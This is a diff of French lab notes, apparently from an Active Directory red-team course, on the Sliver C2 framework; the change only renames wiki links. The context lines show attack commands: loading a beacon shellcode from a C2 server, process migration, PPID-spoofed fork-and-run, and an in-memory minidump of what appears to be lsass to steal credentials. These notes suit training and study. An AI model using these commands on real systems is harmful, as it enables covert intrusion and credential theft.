@@ -20,7 +20,7 @@ C:\AD\Tools\Sliver\BinLoader.exe 172.16.100.X 8080 dcorp-std_https.bin
 [server] sliver (…) > migrate -p <pid>
 ```
 
-## Exécution en mémoire · [[Sliver - Exécution et évasion]]
+## Exécution en mémoire · [[w. Sliver C2/Sliver - Exécution et évasion]]
 
 ```bash
 # Fork & run (PPID spoof)
@@ -96,7 +96,7 @@ execute-assembly -i -M -E -t 60 '/mnt/c/AD/Tools/Sliver/minidumpdotnet.exe' 'lsa
 
 **Fiches :**
 - [[Sliver - Setup et beacons]]
-- [[Sliver - Exécution et évasion]]
+- [[w. Sliver C2/Sliver - Exécution et évasion]]
 - [[Sliver - Énumération AD]]
 - [[Sliver - Privesc et lateral]]
 - [[Sliver - Kerberos et tickets]]
